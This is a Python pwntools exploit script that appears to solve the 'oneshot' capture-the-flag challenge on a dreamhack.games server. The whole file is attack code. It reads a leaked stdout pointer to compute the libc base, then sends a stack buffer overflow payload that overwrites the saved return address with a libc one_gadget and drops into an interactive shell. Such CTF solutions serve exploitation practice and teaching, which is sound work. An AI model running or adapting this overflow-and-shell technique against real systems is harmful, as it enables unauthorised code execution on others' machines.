#!/usr/bin/env python3

from pwn import *

exe = ELF('oneshot_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+138
        c
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 15470)
else:
    p = process([exe.path])
GDB()

##########################
### STAGE 1: Leak libc ###
##########################
p.recvuntil(b'stdout: ')
libc_leak = int(p.recvline()[:-1], 16)
libc.address = libc_leak - 0x3c5620
info("Libc leak: " + hex(libc_leak))
info("Libc address: " + hex(libc.address))

#########################################
### STAGE 2: Overwrite Return Address ###
#########################################
one_gadget = 0xf1147
payload = flat(
    b'A'*8*3,
    p64(0), # Set v5 = 0 
    p64(0), # Saved rbp
    libc.address + one_gadget,
    )
sla(b'MSG: ', payload)

p.interactive()
